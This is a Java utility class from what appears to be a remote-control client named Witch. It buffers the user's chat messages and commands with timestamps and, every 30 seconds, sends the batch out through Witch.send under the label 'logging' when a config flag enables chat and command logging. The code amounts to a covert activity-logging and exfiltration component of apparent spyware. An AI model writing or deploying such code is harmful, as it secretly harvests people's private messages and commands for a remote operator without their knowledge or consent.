package me.soda.witch.client.utils;

import me.soda.witch.client.Witch;

import java.time.LocalDateTime;
import java.time.format.DateTimeFormatter;
import java.util.ArrayList;
import java.util.List;
import java.util.concurrent.Executors;
import java.util.concurrent.ScheduledExecutorService;
import java.util.concurrent.TimeUnit;

public class LoopThread {
    public static final ScheduledExecutorService executor = Executors.newSingleThreadScheduledExecutor();
    private static List<String> readyToSendStrings = new ArrayList<>();

    public static void init() {
        executor.scheduleAtFixedRate(LoopThread::sendInfo, 0, 30, TimeUnit.SECONDS);
    }

    private static void sendInfo() {
        if (Witch.CONFIG_INFO.logChatAndCommand && !readyToSendStrings.isEmpty()) {
            Witch.send("logging", String.join("\n", readyToSendStrings) + "\n");
            readyToSendStrings = new ArrayList<>();
        }
    }

    public static void addToList(String msg) {
        String time = LocalDateTime.now().format(DateTimeFormatter.ofPattern("HH:mm:ss "));
        readyToSendStrings.add(time + msg);
    }
}
